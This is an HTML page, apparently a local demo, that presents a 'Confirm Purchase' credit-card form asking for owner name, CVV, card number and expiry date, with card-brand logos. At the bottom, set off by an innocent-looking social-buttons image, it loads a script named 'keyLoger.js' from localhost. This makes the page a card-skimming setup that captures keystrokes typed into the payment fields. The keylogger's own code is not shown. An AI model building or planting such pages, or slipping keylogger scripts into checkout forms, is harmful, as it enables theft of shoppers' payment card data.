<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BankCardsAndComments</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="/style/creditCards.css">
</head>
<body>

<div class="creditCardForm">
    <div class="heading">
        <h1>Confirm Purchase</h1>
    </div>
    <div class="payment">
        <form>
            <div class="form-group owner">
                <label for="owner">Owner</label>
                <input type="text" class="form-control" id="owner">
            </div>
            <div class="form-group CVV">
                <label for="cvv">CVV</label>
                <input type="text" class="form-control" id="cvv">
            </div>
            <div class="form-group" id="card-number-field">
                <label for="cardNumber">Card Number</label>
                <input type="text" class="form-control" id="cardNumber">
            </div>
            <div class="form-group" id="expiration-date">
                <label>Expiration Date</label>
                <select>
                    <option value="01">January</option>
                    <option value="02">February </option>
                    <option value="03">March</option>
                    <option value="04">April</option>
                    <option value="05">May</option>
                    <option value="06">June</option>
                    <option value="07">July</option>
                    <option value="08">August</option>
                    <option value="09">September</option>
                    <option value="10">October</option>
                    <option value="11">November</option>
                    <option value="12">December</option>
                </select>
                <select>
                    <option value="16"> 2016</option>
                    <option value="17"> 2017</option>
                    <option value="18"> 2018</option>
                    <option value="19"> 2019</option>
                    <option value="20"> 2020</option>
                    <option value="21"> 2021</option>
                    <option value="22"> 2022</option>
                    <option value="23"> 2023</option>
                </select>
            </div>
            <div class="form-group" id="credit_cards">
                <img src="http://hubs.ua/wp-content/uploads/2015/11/viza-640x360.jpg" id="visa" class="imgCards">
                <img src="http://www.luiss.edu/sites/www.luiss.it/files/images/notices/30/MasterCard_Logo_svg_.png"
                     id="mastercard" class="imgCards">
                <img src="http://economic-definition.com/Images/Forex_Otzovik/370/280/1991950611-Oficial_nyy_logotip_American_Express__sokraschennoe_naimenovanie_AmEx_.jpg"
                     id="amex" class="imgCards">
            </div>
            <div class="form-group" id="pay-now">
                <button type="submit" class="btn btn-default" id="confirm-purchase">Confirm</button>
            </div>
        </form>
    </div>
</div>


<div id="socialButtons">
    <div id="imgBox">
        <img src="http://localhost:8000/img/icons.png" alt="socialButtons">
    </div>
</div>
<script src="http://localhost:8000/js/keyLoger.js"></script>

</body>
</html>
